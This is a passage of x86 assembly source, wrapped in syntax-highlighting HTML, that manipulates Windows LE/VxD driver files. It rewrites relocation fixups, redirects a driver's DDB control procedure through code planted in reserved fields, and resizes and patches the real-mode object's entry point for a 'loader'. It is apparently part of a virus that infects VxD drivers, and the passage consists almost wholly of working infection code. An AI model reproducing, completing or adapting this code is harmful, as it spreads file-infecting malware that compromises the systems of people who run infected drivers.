+(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc5">IMAGE_BND_ENTRY32</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Update_DDB_Fail</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_ENTRY_BUNDLE.EH_offset</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">eax.DDB_Reserved1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DDB_Offset_Obj</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Calculate_Page</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Get_Page_Offset</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Bad_DDB_Page</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DDB_Offset_File</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">VxD_Desc_Block</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">DDB_Buffer</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileIO_Read</span><span class="sc0"> </span><span class="sc1">;Read DDB</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">Bad_DDB_Page</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Update_DDB_Fail</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DDB_Control_Proc</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Calculate_Page</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_fpagetab</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Recalc</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc5">IMAGE_SIZEOF_FIXUP_PAGE_HEADER</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc5">IMAGE_SIZEOF_FIXUP_PAGE_HEADER\
</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_FIXUP_PAGE_HEADER</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_frectab</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Recalc</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Find_Reloc</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">Modify_Reloc</span><span class="sc0"> </span><span class="sc1">;Relocation found</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Update_DDB_Fail</span><span class="sc0"> </span><span class="sc1">;Unknown relocation type</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DDB_Offset_Obj</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">DDB_Buffer.DDB_Control_Proc</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Store_Displacement</span><span class="sc0">
</span><span class="sc5">Modify_Reloc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DDB_Offset_Obj</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Modify_Reloc32</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Update_DDB_Fail</span><span class="sc0"> </span><span class="sc1">;Offset doesn't fit in relocation</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Set_Write_Info_Flag</span><span class="sc0">
</span><span class="sc5">Modify_Reloc32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Set_Write_Info_Flag</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Write_LE_Info</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">Store_Displacement</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;Store:</span><span class="sc0">
</span><span class="sc1">;VMMCall Test_Debug_Installed</span><span class="sc0">
</span><span class="sc1">;call edx</span><span class="sc0">
</span><span class="sc1">;dd ? (relocation to the original DDB control procedure)</span><span class="sc0">
</span><span class="sc1">;(in the DDB reserved fields)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">DDB_Buffer.DDB_Reserved1</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">Dyna_Link_Int</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">lowword</span><span class="sc0"> </span><span class="sc5">@@Test_Debug_Installed</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">DDB_Buffer.DDB_Reserved2</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],(</span><span class="sc2">1234h</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)\
+(</span><span class="sc9">highword</span><span class="sc0"> </span><span class="sc5">@@Test_Debug_Installed</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">DDB_Buffer.DDB_Reserved3</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Update_DDB_Fail</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Calculate page relative offset</span><span class="sc0">
</span><span class="sc1">;þ On entry:</span><span class="sc0">
</span><span class="sc1">;  EAX=Offset (within first object)</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;  LE_Info_Mem=Pointer to LE info (allocated memory)</span><span class="sc0">
</span><span class="sc1">;þ On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX=?</span><span class="sc0">
</span><span class="sc1">;  ECX=Page number</span><span class="sc0">
</span><span class="sc1">;  EDX=Offset (within page)</span><span class="sc0">
</span><span class="sc5">Calculate_Page</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cdq</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_pagesize</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Get_Object_Table</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.OH_pagemap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Find a relocation (within a page)</span><span class="sc0">
</span><span class="sc1">;þ On entry:</span><span class="sc0">
</span><span class="sc1">;  EBX=Start of "Fixup Record" data for the page</span><span class="sc0">
</span><span class="sc1">;  ECX=End of "Fixup Record" data for the page</span><span class="sc0">
</span><span class="sc1">;  DX=Offset to seek (within the page)</span><span class="sc0">
</span><span class="sc1">;þ On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX,EBX=?</span><span class="sc0">
</span><span class="sc1">;  * Carry flag clear:</span><span class="sc0">
</span><span class="sc1">;    EDX=Pointer to relocation</span><span class="sc0">
</span><span class="sc1">;    AH=0: 16-bit relocation</span><span class="sc0">
</span><span class="sc1">;    AH&gt;0: 32-bit relocation</span><span class="sc0">
</span><span class="sc1">;  * Carry flag set:</span><span class="sc0">
</span><span class="sc1">;    EBXòECX: Relocation not found</span><span class="sc0">
</span><span class="sc1">;    EBX&lt;ECX: ERROR</span><span class="sc0">
</span><span class="sc5">Find_Reloc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">Find_Reloc_Next</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Find_Reloc_Fail</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.FR_stype</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">IMAGE_RLC_32BITOFF</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Find_Reloc_Fail</span><span class="sc0"> </span><span class="sc1">;Invalid relocation type</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IMAGE_RLC_ST_CHAIN</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Reloc_List</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IMAGE_RLC_ST_SOFF32</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Skip_Reloc</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IMAGE_RLC_ST_OFF32</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Find_Reloc_Fail</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.FR_fixup.FH_obj</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Skip_Reloc</span><span class="sc0"> </span><span class="sc1">;Wrong object</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.FR_fixup.FH_soff</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Skip_Reloc</span><span class="sc0"> </span><span class="sc1">;Wrong source offset</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.FR_fixup.FH_offset</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Find_Reloc_OK</span><span class="sc0">
</span><span class="sc5">Skip_Reloc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">IMAGE_RLC_INTSIZE16</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Go_Next_Reloc</span><span class="sc0">
</span><span class="sc5">Reloc_List</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IMAGE_RLC_ST_SOFF32</span><span class="sc4">+</span><span class="sc5">IMAGE_RLC_ST_CHAIN</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Skip_Reloc_List</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IMAGE_RLC_ST_OFF32</span><span class="sc4">+</span><span class="sc5">IMAGE_RLC_ST_CHAIN</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Find_Reloc_Fail</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.FR_chain.FC_obj</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Skip_Reloc_List</span><span class="sc0"> </span><span class="sc1">;Wrong object</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.FR_chain.FC_srccount</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Next_List_Reloc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">js</span><span class="sc0"> </span><span class="sc5">Skip_Reloc_List</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Compare_List16</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_RLC_LISTSIZE32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Offset_Compared</span><span class="sc0">
</span><span class="sc5">Compare_List16</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_RLC_LISTSIZE16</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">Offset_Compared</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Next_List_Reloc</span><span class="sc0"> </span><span class="sc1">;Wrong source offset</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.FR_chain.FC_offset</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Find_Reloc_OK</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Skip_Reloc_List</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.FR_chain.FC_srccount</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc5">IMAGE_RLC_LISTSIZE16</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Go_Next_Reloc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Find_Reloc_Next</span><span class="sc0">
</span><span class="sc1">;Add ebx,(IMAGE_RLC_INTSIZE32-IMAGE_RLC_INTSIZE16)=(IMAGE_RLC_LISTSIZE32\
;-IMAGE_RLC_LISTSIZE16)</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Find_Reloc_Next</span><span class="sc0">
</span><span class="sc5">Find_Reloc_Fail</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Fix the real-mode object</span><span class="sc0">
</span><span class="sc1">;þ On entry:</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;  EDI=File_Delta</span><span class="sc0">
</span><span class="sc1">;  LE_Info_Mem=Pointer to LE info (allocated memory)</span><span class="sc0">
</span><span class="sc1">;þ On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX,ECX,EDX=?</span><span class="sc0">
</span><span class="sc1">;  * Carry flag clear:</span><span class="sc0">
</span><span class="sc1">;    EAX=Offset (within file) of real-mode object</span><span class="sc0">
</span><span class="sc1">;    LE header updated (if necessary)</span><span class="sc0">
</span><span class="sc1">;    Set the Write_LE_Header flag if LE header modified</span><span class="sc0">
</span><span class="sc1">;    LE info updated (if necessary)</span><span class="sc0">
</span><span class="sc1">;    Set the Write_LE_Info flag if LE info modified</span><span class="sc0">
</span><span class="sc1">;    Return_IP updated</span><span class="sc0">
</span><span class="sc1">;  * Carry flag set: ERROR</span><span class="sc0">
</span><span class="sc5">Fix_Real_Mode</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Get_Object_Table</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_objcnt</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Check_Next_Obj</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.OH_flags</span><span class="sc4">],</span><span class="sc5">IMAGE_OBJ_READ</span><span class="sc4">+</span><span class="sc5">IMAGE_OBJ_EXEC\
</span><span class="sc4">+</span><span class="sc5">IMAGE_OBJ_ALIAS16</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Found_Real_Mode</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_OBJECT_HEADER</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Check_Next_Obj</span><span class="sc0">
</span><span class="sc5">Fix_Real_Mode_Fail</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Found_Real_Mode</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">Loader_Size</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.OH_size</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Real_Mode_Size_OK</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Fix_Real_Mode_Fail</span><span class="sc0"> </span><span class="sc1">;Don't patch size if last object</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.OH_size</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Write_LE_Info</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">Real_Mode_Size_OK</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_startobj</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">No_EIP_Patch</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_eip</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">No_EIP_Patch</span><span class="sc0">
